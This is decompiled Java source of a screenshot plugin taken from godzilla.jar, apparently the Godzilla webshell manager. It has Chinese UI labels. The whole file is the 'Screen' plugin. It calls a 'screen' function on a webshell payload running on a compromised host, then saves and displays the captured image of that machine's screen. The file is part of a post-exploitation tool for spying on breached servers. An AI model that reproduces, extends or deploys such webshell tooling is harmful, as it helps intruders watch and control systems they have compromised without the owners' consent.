/*     */ package shells.plugins.java;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.dialog.GFileChooser;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.io.ByteArrayInputStream;
/*     */ import java.io.File;
/*     */ import java.io.FileOutputStream;
/*     */ import javax.imageio.ImageIO;
/*     */ import javax.swing.ImageIcon;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Screen", DisplayName = "屏幕截图")
/*     */ public class Screen
/*     */   implements Plugin
/*     */ {
/*     */   private final JPanel panel;
/*     */   private final JButton runButton;
/*     */   private final JSplitPane splitPane;
/*     */   private final JLabel label;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public Screen() {
/*  43 */     this.panel = new JPanel(new BorderLayout());
/*  44 */     this.runButton = new JButton("screen");
/*  45 */     this.splitPane = new JSplitPane();
/*     */     
/*  47 */     this.splitPane.setOrientation(0);
/*  48 */     this.splitPane.setDividerSize(0);
/*     */     
/*  50 */     JPanel topPanel = new JPanel();
/*  51 */     topPanel.add(this.runButton);
/*     */     
/*  53 */     this.label = new JLabel(new ImageIcon());
/*     */     
/*  55 */     this.splitPane.setTopComponent(topPanel);
/*  56 */     this.splitPane.setBottomComponent(new JScrollPane(this.label));
/*     */     
/*  58 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/*  61 */             Screen.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/*  65 */     this.panel.add(this.splitPane);
/*     */   }
/*     */   
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/*  69 */     byte[] result = this.payload.evalFunc(null, "screen", new ReqParameter());
/*     */     try {
/*  71 */       if (result.length < 100) {
/*  72 */         Log.error(this.encoding.Decoding(result));
/*     */       }
/*  74 */       GFileChooser chooser = new GFileChooser();
/*  75 */       chooser.setFileSelectionMode(0);
/*  76 */       boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
/*  77 */       File selectdFile = chooser.getSelectedFile();
/*  78 */       if (flag && selectdFile != null) {
/*  79 */         FileOutputStream fileOutputStream = new FileOutputStream(selectdFile);
/*  80 */         fileOutputStream.write(result);
/*  81 */         fileOutputStream.close();
/*  82 */         GOptionPane.showMessageDialog(this.panel, String.format("save screen to -> %s", new Object[] { selectdFile.getAbsolutePath() }), "提示", 1);
/*     */       } 
/*  84 */       this.label.setIcon(new ImageIcon(ImageIO.read(new ByteArrayInputStream(result))));
/*     */     }
/*  86 */     catch (Exception e) {
/*  87 */       Log.error(e);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/*  93 */     this.shellEntity = shellEntity;
/*  94 */     this.payload = this.shellEntity.getPayloadModule();
/*  95 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/*  96 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 103 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\Screen.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */